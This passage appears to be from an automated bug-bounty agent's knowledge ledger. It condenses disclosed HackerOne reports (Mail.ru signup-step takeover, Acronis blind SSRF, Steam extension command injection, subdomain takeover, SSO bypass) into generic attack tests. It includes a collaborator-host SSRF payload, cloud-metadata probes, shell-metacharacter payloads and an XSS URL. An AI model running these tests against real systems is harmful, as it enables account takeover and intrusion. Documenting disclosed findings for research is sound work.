`<image href>`, `<link href>`, `<object data>`, `<embed src>`, `<video poster>`, `<source srcset>`,
CSS `background:url()`, `@import`, `<style>` `@font-face src`, `<meta http-equiv="refresh"
content="0;url=…">`); (3) open the message with the block mode ON and watch your collector — any hit
is a bypass; (4) if the carrier is SVG, also test the filter-primitive family (`feImage`,
`feDisplacementMap`, `feComposite`, `feFlood`, `feBlend`) and `xlink:href` vs `href`. Rule: **a
remote-resource blocklist is only as strong as its element/attribute coverage — enumerate the carrier
set, not the obvious tags, because the renderer resolves URLs from primitives the filter never heard
of.**
DEDUPE: 0 hits across all three write targets for `3486747`, `feImage`, `feImage href`, `allow_remote`,
`rcube_washtml`, `is_image_attribute`, `wash_link`, or an SVG filter primitive used to bypass a
remote-image blocklist. Pre-existing SVG material REVIEWED as related-but-distinct: the SVG-upload-XSS
entries (TikTok Ads #1504202, the Shopify `data:`->`blob:` entry ~ledger 3487, the SSO-fragment SVG
entry ~ledger 3172) are about script EXECUTION in an SVG served as a document, and the librsvg
memory-disclosure entries (#3082917 / §10.5) are about uninitialized memory in a rasterizer — none is
a sanitizer's remote-resource carrier-coverage gap. Pre-existing blocklist material (~ledger 296, 488,
2074) is about SSRF hostname / resolved-IP / URL-string inspection, a different blocklist. New general
method -> §17.450.

SOURCE: https://hackerone.com/reports/18992  2026-11-11
ROUTE: report body read from the LOCAL disclosed-reports mirror `/tmp/h1_val.parquet`
(`visibility: full`, `vulnerability_information` 1,235 B, read with `/usr/bin/python3.12` + pyarrow);
the id is absent from `/tmp/h1_{train,test}.parquet`. The live page is Cloudflare-gated from this
egress (`web_extract` -> 403, `r.jina.ai` -> CAPTCHA then `/users/sign_in`). Metadata: Mail.ru,
"Possibility to attach any mobile number to any email", weakness Improper Authentication - Generic,
bounty paid, 54 votes, submitted 2014-07-04, disclosed 2016-07-18, Resolved.
STATUS: UNVERIFIED (not reproduced — no Mail.ru signup flow was touched this pass; every step below is
verbatim from the report body).
CLASS: authentication bypass / account takeover via a CLIENT-CONTROLLED REGISTRATION STEP INDEX —
the multi-step signup carries its CURRENT STEP in a request parameter (`RegStep`), so the
identifier-ownership verification step can be skipped and the phone-binding step can be reached for an
ARBITRARY e-mail name (CWE-841 / CWE-372 / CWE-287).
CORE METHOD:
  1. The entry point: `https://m.mail.ru/cgi-bin/signup`.
  2. The primitive, verbatim: "Put target email name and anything you want in other inputs; Submit
     form and modify on the fly the RegStep to 5 with Tamper Data" — the step index is a request
     value, not server-side session state.
  3. The skip: with `RegStep` forced to 5 the flow lands on the mobile-number step WITHOUT the
     e-mail-ownership step having run — "Submit your mobile number which you want to attach".
  4. The verification loop belongs to the ATTACKER: "Get SMS and confirm link in it. Example:
     `http://bk.ru/t/EucBxHz3nI2wdap` => `https://m.mail.ru/cgi-bin/reg?ID=YOUR_ID_HERE&code=YOUR_CODE_HERE&RegStep=10`".
  5. The second pass, verbatim: "Then go to
     `https://m.mail.ru/cgi-bin/reg?ID=YOUR_ID_HERE&code=YOUR_CODE_HERE&RegStep=2`" — submit the phone
     number and a password, get a second SMS, confirm again.
  6. The outcome, verbatim: "Now you can log in to target email account and look the security settings.
     There are will be shown your confirmed mobile phone number."
DETECTION SIGNAL: any multi-step signup / registration / onboarding flow whose CURRENT STEP is carried
in a request parameter — `RegStep`, `step`, `stage`, `phase`, `flow_step`, `?step=5`, a hidden form
field — rather than in server-side session state; a step that BINDS a recovery factor (phone, e-mail,
2FA) to the account; a flow where the e-mail-ownership step and the phone-binding step are separate and
the phone step does not re-verify the address. Tell: the step number is in the URL / query string and
editing it changes which form the server renders.
CHAIN: an anonymous visitor (primitive: the signup endpoint is unauthenticated) -> the registration
flow's step index is a client-supplied parameter, so `RegStep` is forced from the e-mail step to the
phone-binding step (primitive: the flow trusts the client's step pointer and never re-checks that the
e-mail-ownership step completed) -> the attacker's own mobile number is confirmed against the TARGET's
e-mail name (escalation: a recovery factor is bound to a victim's identifier without the victim's
consent) -> the attacker logs in to the target mailbox (impact: account takeover; the report's own
words — "you can get access to the email using the attached phone number"). Per doctrine §8:
preconditions = a reachable multi-step signup whose step index is client-controlled, and a working
mobile number the attacker controls; gain = login access to an arbitrary e-mail account.
TRANSFERABLE TEST: on ANY multi-step signup / registration / onboarding flow — (1) capture the requests
and look for a step / stage / phase index in the URL, query string, hidden input or JSON body
(`RegStep`, `step`, `stage`, `phase`, `flow`, `wizard`); (2) submit the FIRST step with a VICTIM's
identifier (e-mail / phone / username) and then re-send the SAME request with the step index forced
FORWARD to the step that binds a recovery factor or finishes the account (try every value 1..N);
(3) if the server renders or accepts the later step without the earlier verification, complete it with
the ATTACKER's own phone / e-mail; (4) then try to LOG IN to the victim's identifier with the
attacker's factor, or trigger a password reset to the factor just bound; (5) the control is the same
flow walked honestly — if the honest path demands an e-mail-ownership check the skipped path never
performed, the check is UI-only. Rule: **when the step index is a request parameter, the flow's
ordering is a client assertion — force the index forward past the identifier-ownership step and bind
your own recovery factor to the victim's identifier.**
DEDUPE / DELTA: 0 hits across all three write targets for `18992`, `RegStep`,
`m.mail.ru/cgi-bin/signup`, or a client-controlled registration step index used to bind a phone to a
victim's e-mail. Related-but-distinct pre-existing material REVIEWED and kept as-is: **V-02** in
`/root/Bugbountyskills.md` ("State machine defiance via workflow circumvention and multi-step
transaction skipping") records the GENERAL method — each step's endpoint runs without checking that the
prior state was reached, tested by calling step 3 directly — and its Detect list is endpoint-ORDER
based; this entry records the DELTA that the flow's CURRENT STEP is itself a client-supplied VALUE
(`RegStep`) in the URL, so the bypass is a parameter-value tamper rather than an endpoint-order tamper,
and the concrete carrier is a signup flow whose skipped step is the e-mail-ownership check and whose
reached step binds a phone. Also reviewed: the ledger's phone-factor entries — the phone-number-CHANGE
flow accepting `0000` (#2588329 / V-07 delta) and the OTP delivery-address recipient-list injection
(#990048 / §17.196) — both are verification-step or delivery-channel bugs, not a step-index skip.
NO §17 slot (the general method is V-02).

NOTE — reader pass 2026-11-11 batch 149 (6 assigned sources read ONE BY ONE in the given order; 4
entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file
`/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md`; 3 new §17 slots). NEW: #3620006
(Monero — `--restricted-rpc` is documented as view-only but enforcement is ad hoc per handler, so a
restricted client calls `create_wallet` / `close_wallet` / `open_wallet` / `create_address` /
`export_key_images` and reaches `get_tx_key` / `get_reserve_proof` -> §17.448), #3543475
(Basecamp/fizzy.do — the import path's `convert_gids_to_sgids` resolves attacker-supplied GLOBAL `gid`
references into persisted `sgid` values with no tenant check, while the EXPORT path in the same file
checks `record.account_id == account.id` -> cross-tenant ActionText reference resolution -> §17.449),
#3486747 (Nextcloud/Roundcube — the sanitizer blocks `<img>`/`<image>`/`<use>` via
`is_image_attribute()` but not the SVG filter primitive `<feImage href>`, which passes through
`wash_link()` -> a 1x1 invisible SVG tracking pixel loads with "block remote images" ON -> §17.450).
DELTA (no §17 slot): #18992 (Mail.ru — a multi-step signup carries its CURRENT STEP in the
client-controlled `RegStep` URL parameter; forcing it from the e-mail step to the phone-binding step
skips the e-mail-ownership check and binds the attacker's mobile number to the TARGET's e-mail name ->
login to the target mailbox; the general state-machine method is V-02, this is the step-index-value
carrier). VALID-BUT-NOT-APPENDED: #3100570 (pixiv, "Bypassing Inbox Privacy Settings and Enabling Spam
on Pixiv.net", `visibility: no-content`, 0 B body — the only public text is the program summary: "By
manipulating the id parameter in the message-sending POST request, an attacker can bypass inbox
privacy settings, sending unauthorized messages to users who have opted out. Additionally, the lack of
rate limiting or duplicate request validation allows attackers to spam users"; a generic recipient-id
BAC with no request shape beyond the parameter name, no documented chain, and a spam/harassment impact
that doctrine §2(d) excludes standalone). INVALID: #3809407 (AWS VDP, "AWS *.a2z.com | Unauthenticated
Clickhouse UI : Database access + SSRF", High — live `.json` HTTP 200 but `visibility: no-content`,
`vulnerability_information` 0 B; the only public text is the team's thank-you ("We would like to thank
@notnotnotveg for reporting this issue to AWS VDP and collaborating with us on this disclosure.");
every fallback route was tried and none carries a method — `web_extract` 403, `r.jina.ai` 401/CAPTCHA,
the browser tool -> "Sorry, something went wrong", the Wayback capture -> a JS-disabled shell, and the
ajaysenr mirror -> "No vulnerability information available"; the reporter's own public nuclei template
`clickhouse-db-unauth.yaml` is a generic ClickHouse detector from 2021, not a writeup of this report,
so nothing was imported from it). 0 fabricated. Knowledge intake only — no target was touched; the only
network traffic was `web_extract`/`curl` against `hackerone.com` (live `.json` + `r.jina.ai`), the
Wayback availability + page endpoints, a web search, and reads of the local disclosed-reports parquet
mirrors `/tmp/h1_{train,val,test}.parquet`.

SOURCE: https://hackerone.com/reports/1086206  2026-11-11
ROUTE: full reporter body (2,696 B) read this pass from the LIVE `https://hackerone.com/reports/1086206.json`
route (`visibility: full`); the report page itself also rendered via `web_extract`. Metadata: Acronis,
"Blind SSRF vulnerability on cz.acronis.com", weakness Server-Side Request Forgery (SSRF), Medium,
reporter `cabelo`, disclosed 2024-08-27, Resolved.
STATUS: UNVERIFIED (not reproduced — no Acronis property was touched this pass; every step below is taken
from the report body).
CLASS: blind SSRF, unauthenticated, via a WordPress/WooCommerce CHECKOUT action whose FREE-TEXT `address`
/ `company` field is fetched server-side by the payment integration (CWE-918).
CORE METHOD:
  1. Entry point: `POST https://cz.acronis.com/wp-admin/admin-ajax.php` with `action=createPayment` —
     the WooCommerce cart checkout (`Referer: https://cz.acronis.com/kosik/?item=7200`).
  2. The carrier is NOT a URL-typed parameter: it is the free-text delivery `address` body field (the
     reporter also names `company`). Value used: `address=http%3a%2f%2fjczo3ewu8jpfgyiajmkacspsnjtbh0.burpcollaborator.net/ssrf`.
  3. The rest of the body is an ordinary guest checkout (`items[0][name]`, `items[0][price]`, `name`,
     `email`, `phone`, `zip`, `city`, `isCompany=YES`, `action=createPayment`) — no login is needed; the
     reporter's own words: "this vulnerability allows any unauthenticated user/client to make Wordpress
     send HTTP requests to any URL/address (internal or external)".
  4. The app still returns the NORMAL payment response — `HTTP/1.1 200 OK` with
     `{"status":"ok","gw_url":"https:\/\/gate.gopay.cz\/gw\/v3\/eec2d2792d0935ea959b71b0762a4559"}` — so the
     SSRF is BLIND and the success page is indistinguishable from a legit checkout.
  5. The proof is out-of-band: "Callback HTTP connection from Acronis server 109.123.216.85 (SSRF
     vulnerability)".
DETECTION SIGNAL: any unauthenticated `admin-ajax.php` / guest-checkout / payment action
(`action=createPayment`, a `wp_ajax_nopriv_*` handler) whose form has FREE-TEXT fields that are forwarded
to a downstream integration (payment gateway, CRM, shipping/geocoding, invoicing); a 200 that still
carries the normal gateway/redirect value (`gw_url`, `redirect_url`, `payment_url`) while an OOB callback
arrives from the target's own address; MORE THAN ONE field working (`address` AND `company`) — the tell
that the sink is "any field the integration passes on", not one named URL parameter.
CHAIN: an anonymous visitor (primitive: the checkout AJAX action is unauthenticated) -> a free-text
business field (`address`/`company`) is handed to the payment integration, which issues an HTTP request to
it (primitive: a free-text field is a server-side fetch sink) -> the target's server makes an outbound
request to any internal or external address (escalation: blind SSRF with internal reach) -> internal
host/port probing and, where the integration can reach cloud metadata or an internal service,
credential/service access (impact: internal reach; HackerOne rated this instance Medium as a blind SSRF,
doctrine §6 rates SSRF with internal reach P2). Per doctrine §8: preconditions = reach the guest checkout
of a store whose payment action forwards free-text fields; gain = unauthenticated outbound HTTP from the
target's network to any address.
TRANSFERABLE TEST: on ANY checkout / payment / shipping / invoice form — (1) capture the payment request
and enumerate EVERY free-text body field (address lines, company, customer note, `url`/`callback`/
`return_url`, tax/VAT fields); (2) set each field, one at a time, to `http://<your-collaborator>/ssrf` and
submit; (3) watch the collaborator for a callback whose source address belongs to the target; (4) the
CONTROL is the same checkout with a benign value — benign = no callback, URL-value = callback, and the
response is a normal 200 both times; (5) replay the winning field with `http://127.0.0.1:<port>/` and
`http://169.254.169.254/latest/meta-data/` and sweep ports by timing. Rule: **in a payment flow the SSRF
carrier is usually a free-text field the gateway integration forwards, not a parameter that looks like a
URL — test address/company/note fields, and use the normal 200-with-gateway-URL response as the
"nothing is wrong" control.**

SOURCE: https://hackerone.com/reports/840243  2026-11-11
ROUTE: `visibility: no-content`, `vulnerability_information` 0 B — THE REPORT BODY IS WITHHELD. Readable
public text = the title + the program summary (via the ajaysenr mirror
`https://github.com/ajaysenr/HackerOne-Disclosed-Reports/blob/main/reports/840243.md`) + the live `.json`
metadata. Routes tried and failed, in order: `web_extract` on the page -> metadata only, no body; the
BROWSER TOOL on the live URL -> "Sorry, something went wrong"; `r.jina.ai/<url>` -> HTTP 401 "You have
been blocked from performing anonymous queries due to bad IP reputation"; the Wayback capture
`20250615142729` -> a JavaScript-disabled shell ("It looks like your JavaScript is disabled"); the local
disclosed-reports mirror `/tmp/h1_{train,val,test}.parquet` -> id absent; `.json` `attachments: []`.
NOTHING below is invented — every fact is from the title and the program summary.
STATUS: UNVERIFIED (not reproduced — and NOT REPRODUCIBLE from public material: no payload, no request
shape and no response are public).
CLASS: OS command injection (team-rated Critical) via the FILE EXTENSION of an upload field — the
extension is interpolated into a command constructed on a publishing gateway (CWE-78).
CORE METHOD:
  1. Entry point: `https://partner.steamgames.com/apps/communityitems/` — the Steamworks partner page
     for uploading Community items.
  2. The upload carries image fields named `item_image_small` and `item_image_large`; the title names the
     FILE EXTENSION of those two fields as the injection carrier.
  3. The program summary states the mechanism: "Shell injection was achieved on a publishing gateway
     through metacharacter injection in an item-upload path." — a shell metacharacter carried in the
     item-upload path (the extension) reached a command built on the publishing gateway.
  4. Impact: shell command injection on the publishing gateway; Critical, weakness "Command Injection -
     Generic", 52 votes, submitted 2020-04-04, disclosed 2024-07-30.
DETECTION SIGNAL: an upload/media/item form whose file fields are STRUCTURED (a separate small/large image
per field) rather than one free-form file picker — the base filename is usually server-generated or
sanitized, but the EXTENSION is a separate value that is easy to skip because it "looks constrained"; a
publishing/processing gateway behind the upload (image conversion, transcoding, packaging, CDN ingest);
any partner/vendor upload portal. Tell: the extension is a request field in its own right (or the stored
name is built as `<field>.<ext>`), so it can be set independently of the file's content.
CHAIN: an uploader able to reach the item-upload form (primitive) -> the extension of `item_image_small`
/ `item_image_large` carries shell metacharacters into the item-upload path (primitive: the extension is
a user-controlled value that is not allow-listed/encoded) -> the publishing gateway concatenates it into
a command it executes (escalation: the extension has become a shell metacharacter on a command line) ->
command execution on the publishing gateway (impact: RCE, Critical). Per doctrine §8: preconditions = an
upload form that exposes a separate extension/filename value plus a server-side publishing/processing
step; gain = shell on the gateway host.
TRANSFERABLE TEST: on ANY upload/media/item form — (1) enumerate every filename- or extension-bearing
field (the file input's filename AND any separate `item_image_small` / `item_image_large` / `thumbnail` /
`asset` field that carries a name or extension); (2) set the EXTENSION alone to a shell-metacharacter
payload — `x;id`, `x|id`, `x$(id)`, backtick-`id`-backtick, `x%0aid`, `x&&id`, `x>out` — leaving the base
name and the file's magic bytes benign; (3) submit and watch for command output in the response, an OOB
hit, or a side-effect; (4) the CONTROL is the same upload with a clean `.png` extension — if only the
metacharacter extension changes behaviour, the extension is the sink. Rule: **hunters test the filename
and forget the extension — when a form exposes the extension as its own value (or builds `<field>.<ext>`),
that extension is an unvalidated string a publishing/processing pipeline can interpolate straight into a
shell command.**
DEDUPE / DELTA: DELTA on the recorded "a user-controlled filename component reaches a shell" family —
#651518 (kyoshida, CVE-2020-8130: a filename beginning with `|` reaches `Rake::FileList#egrep`, which
shells out), the git argument-injection entry (~ledger 1806, a user-settable path reaching a shell-out
`git`) and the GitLab `path` -> `Open3.popen3` entry (~ledger 2165). NEW in this entry: (a) the carrier
is the EXTENSION of a STRUCTURED upload field, not the leading character of a free-form filename;
(b) the sink is a publishing gateway's item-processing command; (c) the impact is Critical RCE. The prior
entries' tests ("name the file `|id`") do not cover a form where the filename is server-generated and
only the extension is attacker-set. No §17 slot — the general method (a filename/extension value reaching
a shell) is already recorded and the body is withheld, so this is not promoted to a playbook fact.

NOTE — reader pass 2026-11-11 batch 150 (6 assigned sources read ONE BY ONE in the given order; 2 entries
appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file
`/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md`; 1 new §17 slot). NEW: #1086206
(Acronis/cz.acronis.com — the unauthenticated WooCommerce checkout action
`POST /wp-admin/admin-ajax.php` `action=createPayment` takes the FREE-TEXT `address` (and `company`)
field and the payment integration issues an HTTP request to it -> blind SSRF, OOB callback from the
Acronis server 109.123.216.85 while the app still returns the normal
`{"status":"ok","gw_url":"https://gate.gopay.cz/gw/v3/..."}` -> §17.451). DELTA (no §17 slot): #840243
(Valve/partner.steamgames.com — `visibility: no-content`, body withheld; the title + the program summary
("Shell injection was achieved on a publishing gateway through metacharacter injection in an item-upload
path") are the only public text, and they name the FILE EXTENSION of the `item_image_small` /
`item_image_large` upload fields as the carrier -> shell on the publishing gateway, Critical; a delta on
the recorded filename-reaches-a-shell family, and NOT reproducible from public material). NOT APPENDED
(duplicate): #2759243 (U.S. Dept of Defense, "Time-based blind SQL injection", full 2,965 B body read
live — the `sortBy` parameter of `/app/SearchDocs.aspx` is concatenated into the ORDER BY and answered
with `1 WAITFOR DELAY '0:0:5'--`; this is the already-recorded ORDER BY / `sort`-parameter time-based
blind class — §7.8 "Time-based blind SQLi in an ORDER BY / sort parameter — NASA JPL Photojournal" plus
the `order`/`sort` -> ORM `reorder()` CASE-oracle entry ~ledger 7923 and §17.117 — no new bypass, and the
trailing `udTV` token in the payload is unexplained by any public text, so it was not interpreted). NOT
APPENDED (duplicate): #2684274 (Mars, "RXSS on ████ via configUrl parameter", Low 3.8,
`visibility: no-content` — the only public text is the Mars summary naming the Swagger-UI `configUrl`
parameter on the Royal Canin eVet API docs; that exact mechanism is already recorded with a full ATO
chain at ~ledger 2988, and this instance has no chain). INVALID: #2828693 (Mars, "change part of personal
information all users", Critical 9.4, `visibility: no-content`, 0 B body — the only public text is the
Mars summary ("unauthorized access to an API endpoint allows attackers to add new users and modify
personal information of existing users ... predictable user identifier system (4-digit codes) that can be
easily enumerated"); no endpoint path, no request shape, no parameter name, and the technique is the
already-recorded BAC/IDOR class (§3) — the sibling report #2828641 by the same reporter was judged the
same way in batch 146). VALID-BUT-NOT-APPENDED: #1315907 (U.S. Dept of Defense, "Open Akamai ARL XSS on
http://master-config-████████", Medium, full 711 B body read live) — the whole finding is a
REFLECTED-XSS primitive:
`http://master-config-██████/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E`,
i.e. an Akamai ARL host proxying a third-party origin with the origin's own `where` parameter reflected;
the documented impact stops at "The attacker can execute JS code" with no chain beyond it, so per the
chain-only rule it is not entered. The Akamai ARL URL shape (`/7/0/<ttl>/<serial>/<origin-host>/<path>`)
is noted here as a LEAD for a future chain (open ARL -> proxy an internal-only origin -> SSRF), not as a
ledger entry — nothing beyond the reflected XSS is documented in the source. 0 fabricated. Knowledge
intake only — no target was touched; the only network traffic was `web_extract`/`curl` against
`hackerone.com` (live `.json` for all six ids), the Wayback availability + page endpoints, `r.jina.ai`
(401), the browser tool on the three `no-content` pages, the ajaysenr mirror, two web searches, and
reads of the local disclosed-reports parquet mirrors `/tmp/h1_{train,val,test}.parquet`.

SOURCE: https://hackerone.com/reports/2552243  2026-11-11
ROUTE: full reporter body (710 B, `visibility: full`) read live this pass on the `.json` route (`curl -H 'Accept: application/json'` -> HTTP 200); the live HTML page rendered the same body via `web_extract`. Metadata: U.S. Dept Of Defense, "Subdomain takeover ██████", weakness Violation of Secure Design Principles, severity Critical (9 ~ 10), reporter `martinvw` (verified, clear-checked), submitted 2024-06-14, disclosed 2024-07-26, resolved, no bounty, 53 votes.
STATUS: UNVERIFIED (not reproduced — no domain registered, no DNS record touched, no target touched; the reporter's own PoC is a canary URL they served, and the registrability claim is uncorroborated by any public evidence beyond one sentence).
CLASS: subdomain takeover / server-side DNS misconfiguration WITH impact — DELTA on the recorded §17.377 (a CNAME whose target is a hostname under an unregistered domain is claimable by registering the domain). The recorded rule's TELL explicitly EXCLUDED cloud-service claim endpoints ("no `*.s3.amazonaws.com`, no `*.herokuapp.com`, no `*.cloudfront.net` … but a plain domain name"); this instance is the SAME method — same reporter, same programme, same impact wording, two months after the §17.377 source #2499178 — applied to an AWS ELB DNS name.
CORE METHOD (verbatim from the report body):
  1. THE FINDING, verbatim: "The subdomain `█████` is pointing to `open-elb-prod-277276106.us-east-1.elb-amazonaws.com.`, the domain `elb-amazonaws.com` was available for registration"
  2. THE PROOF, verbatim: "Visit http://████████/proof.e7437329-ab61-4f22-a049-df5b3685313a.txt" — a canary file served from the first-party hostname at a path of the reporter's choosing.
  3. THE IMPACT, verbatim (identical wording to #2499178): "host unwanted/malicious content under your domain; receive email on subdomains mentioned above; effectively execute cross-site scripting attacks; in some cases, steal cookie data; in some cases, trick password managers into filling in passwords"
  4. THE FIX, verbatim: "Remove CNAME record █████"
DETECTION SIGNAL: `dig <host>` / `dnsx -cname` returning a CNAME whose target is a cloud DNS name in a namespace the organisation does not itself register — here `*.elb-amazonaws.com` (the AWS ELB DNS shape `<name>-<id>.<region>.elb-amazonaws.com`); a CNAME whose target's PARENT namespace is claimed available for registration; a first-party host whose CNAME leaves the organisation's DNS. DELTA vs §17.377: the recorded tell would have SKIPPED this target as a cloud-service endpoint — the delta is that the same "parent namespace unregistered -> register it" claim was made against an AWS namespace.
CHAIN: unauthenticated attacker enumerates subdomains and resolves each one (primitive: public DNS) -> a first-party host is a CNAME to `<elb-name>.<region>.elb-amazonaws.com` (primitive: the record outlives the resource) -> the reporter asserts the parent namespace `elb-amazonaws.com` was available for registration, so registering it would put the CNAME target under the attacker's control (escalation: the first-party hostname resolves to the attacker) -> canary content served from the first-party host (escalation: a trusted-origin asset under attacker control; XSS / cookie theft / password-manager abuse in the parent's scope, per the reporter's own list). Per doctrine §8: preconditions = the ability to register the claimed-available namespace (NOT established by the public text) and no target interaction; gain = control of a first-party hostname's content and mail. HONESTY: the public text asserts registrability but carries NO `dig`/`whois` transcript (unlike the §17.377 source, which pasted both) and no registrar link; whether the claim path is domain registration or re-creating the ELB resource is not established by anything public. The canary URL proves the reporter served a file at that hostname, not how the name was claimed.
TRANSFERABLE TEST: for EVERY in-scope hostname, run `dig <host> +short` / `dnsx -cname` and read the CNAME chain; for each target split off the registered/owning namespace (`open-elb-prod-277276106.us-east-1.elb-amazonaws.com` -> `elb-amazonaws.com`) and check whether THAT namespace is registered or claimable (`whois`, a registrar search) — do NOT stop at §17.377's cloud-endpoint exclusion, because this instance was claimed in an AWS namespace. Record the `dig` CNAME line and the availability evidence as the PoC; do NOT register or create anything you are not authorised to claim. Then measure blast radius: sensitive TLD? `.`-prefixed cookie scope on the parent? MX record? Rule: **a CNAME whose target's PARENT NAMESPACE is unregistered/claimable is a takeover even when the target looks like a cloud-service DNS name — §17.377's exclusion list (s3 / herokuapp / cloudfront) is not exhaustive; check the namespace, not the flavour of the endpoint.**
DEDUPE / DELTA: 0 hits across all three write targets for `2552243`, `martinvw` as a source, `elb-amazonaws`, `open-elb-prod`, `elb-amazonaws.com was available`. The CORE method is already recorded at §17.377 (source #2499178 — the SAME reporter `martinvw`, same programme, same impact wording, submitted 2024-05-10 vs this 2024-06-14) and at ledger ~10805-10819. Recorded here as a NAMESPACE DELTA ONLY; NO §17 slot (the general method is unchanged).

SOURCE: https://hackerone.com/reports/2262554  2026-11-11
ROUTE: `visibility: no-content`, `vulnerability_information` 0 B on every route (live `.json` HTTP 200 with an empty body; the live HTML page and `r.jina.ai` render only the SPA shell / the programme summary). The method below is the PROGRAMME'S OWN SUMMARY (`summaries[]` -> team), read verbatim from the live `.json` this pass. No reporter steps, no request shapes and no parameters exist publicly. Route that worked: the live `.json` `summaries[]` field.
STATUS: UNVERIFIED (not reproduced — summary-derived; no request shape, no parameter and no PoC exists publicly, and nothing beyond Mars's own published summary is asserted. What actually makes the silent login happen — a trusted-network rule, an unsigned token, an IP-based auto-auth — is NOT public.)
CLASS: authentication bypass -> unauthenticated access to an employee/customer data portal (CWE-287 / CWE-200). Mars, "Critical Unauthenticated Access to Sensitive Employee and Customer Data Including Invoice Details at ████", weakness Improper Authentication - Generic, severity Critical (9.8 -> critical), reporter `skoll101`, submitted 2023-11-23, disclosed 2024-01-30, resolved after a completed retest, no bounty, 53 votes.
CORE METHOD (Mars's own summary, verbatim):
  1. "During a reconnaissance phase, a directory named 'SSO' was discovered on the website ████████." — the entry point is DIRECTORY ENUMERATION on an in-scope host, not a login form and not an API.
  2. "Upon accessing this directory, it redirected to ██████████ , where sensitive employee and customer data, including usernames, emails, purchase history, payment history, bills, phone numbers, customer numbers, credit card numbers, and invoice details, were found to be accessible without requiring any authentication."
  3. "Additionally, the system logged the user in automatically without the need for authentication." — the SSO host MINTS A SESSION FOR AN ANONYMOUS VISITOR on a plain GET of the SSO path: no credential exchange, no flow started, no failure branch.
  4. The resulting session carries access to a data portal holding employee + customer PII and PAYMENT DATA (credit card numbers, bills, invoices).
DETECTION SIGNAL: an in-scope host whose directory surface exposes an SSO-ish path (`sso`, `SSO`, `sso/`, `auth/sso`, `login/sso`, `sso/login`, `sso/index.php`, `adfs`, `adfs/ls`, `cas`, `cas/login`, `oauth`, `openid`, `auth`); a GET of that path that 30x-redirects to an SSO/authentication host; the redirect target answering 200 with ACCOUNT / EMPLOYEE / CUSTOMER DATA while `Set-Cookie` establishes a session and no credential was supplied; any "logged in automatically" behaviour (a session issued before any authentication step). TELL: the session is established by the REDIRECT itself — not by a callback, a token or a form post.
CHAIN: anonymous attacker, no account and no session (primitive: network reach only) -> directory enumeration finds an `SSO` path on an in-scope host (primitive: a discoverable authentication entry point) -> GET it and follow the redirect (primitive: no credentials, no consent, no flow) -> the SSO host silently establishes an authenticated session (escalation: authentication bypass — a session the visitor never earned) -> the session opens an employee/customer data portal (impact: unauthenticated read of usernames, emails, purchase/payment history, bills, phone numbers, customer numbers, CREDIT CARD NUMBERS and invoice details = PII + PCI exposure; Mars rated it Critical 9.8). Per doctrine §8: preconditions = network reach to the host and a discoverable SSO path; gain = the portal's employee/customer PII and payment data.
TRANSFERABLE TEST: on EVERY in-scope host, run a small directory wordlist aimed at authentication entry points (`sso`, `SSO`, `sso/`, `auth/sso`, `login/sso`, `sso/login`, `sso/index.php`, `adfs`, `adfs/ls`, `cas`, `cas/login`, `oauth`, `openid`, `auth`) with NO cookies; for every hit, follow the redirect chain and check (a) whether a session cookie is set and (b) whether the destination renders account/employee/customer data. A 200 with authenticated data and NO credential supplied = silent session minting. Then size the blast radius: which data classes does the portal hold (PII, payment, invoices), is it multi-tenant, and can the session be replayed against an API. Rule: **an SSO path that issues a session to an anonymous GET is an authentication bypass — enumerate directories for the SSO entry point, GET it cookieless, and check whether a session cookie appears and whether the redirect target renders authenticated data.**
DEDUPE / DELTA: 0 hits across all three write targets for `2262554`, `skoll101`, "directory named 'SSO'", "logged the user in automatically", "logged in automatically", or `Improper Authentication - Generic` as a source id. Pre-existing material REVIEWED as related-but-distinct: ledger ~4334-4346 (#294911, Mapbox "Admin Panel Accessed (OAuth Bypassed)") records a session minted on the FAILURE BRANCH of an OAuth exchange — you must START a flow and BREAK it (deny consent, empty `code`, bad `state`); #2262554 needs NO flow at all (a plain GET of a directory-enumerated SSO path), and its impact is a customer/employee PII + PCI data portal rather than an internal admin panel. §17.211 (#311289) is a DECORATIVE login gate at an exposed CI/CD panel (submitting the form admits you) — a cosmetic form, not a silently minted session; the ledger's "no authentication was required" hit (~6680) is the same decorative-gate family. NONE records an SSO ENTRY POINT DISCOVERED BY DIRECTORY ENUMERATION that silently establishes a session for an anonymous visitor. New general method -> §17.452.

NOTE — reader pass 2026-11-11 batch 151 (6 assigned sources read ONE BY ONE in the given order; 2 entries appended to the harvest ledger and the dated knowledge file; 1 new §17 slot, §17.452). Sources: (1) #2552243 -> READ IN FULL (710 B, `visibility: full`, live `.json`), APPENDED AS A NAMESPACE DELTA of §17.377, no §17 slot; (2) #2262554 -> READ (programme summary; body `no-content`, 0 B), APPENDED + §17.452; (3) #2015554 -> READ IN FULL (1,578 B), VALID-BUT-NOT-APPENDED; (4) #2050122 -> INVALID / UNREADABLE; (5) #1879549 -> READ IN FULL (1,107 B), VALID-BUT-NOT-APPENDED; (6) #817331 -> READ IN FULL (419 B), VALID-BUT-NOT-APPENDED.
- #2015554 (Mozilla / getpocket.com/saves, "Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports", weakness Server-Side Request Forgery (SSRF), reporter `harshdranjan`, submitted 2023-06-07, disclosed 2024-01-12) — full 1,578 B body read live on the `.json` route. The method: an authenticated user adds a URL in Pocket's "saves" flow; submitting `https://127.0.0.1:<port>` returns a DIFFERENT RESPONSE LENGTH for open vs closed ports (the reporter's own examples: 22 open, 21 closed, 86 open, 88 open, 87 closed; "Proving that the Open ports gives greater then 3000 length response"), and a second attachment claims internal server-status/version data was readable. NOT APPENDED, for two independent reasons: (a) the ORACLE CLASS IS ALREADY RECORDED — a length/timing-differential internal port scan against a URL-fetch endpoint is recorded at ledger ~10554 (a chat image-check endpoint: submit `{"url":"http://127.0.0.1:<port>/"}` and diff response length/timing) and at ~3357 (#1960765, Reddit Matrix `preview_url` blind SSRF -> `og:title` read oracle + internal port scan); the only delta is the carrier (Pocket's add-URL/saves action), an endpoint-only delta. (b) THE PROGRAMME CLOSED IT AS A FALSE POSITIVE — Mozilla's triager, verbatim: "After consulting with the internal team, it turns out that this was a false positive. It was previously report to Mozilla on a separate platform 4 years ago and it was ruled out as a caching issue and not an SSRF." Severity changed from high to NONE; state Informative; the reporter disputed the ruling and disclosed anyway, which does not overturn the programme's technical finding. MEASURED-NEGATIVE CAUTION worth carrying forward: a 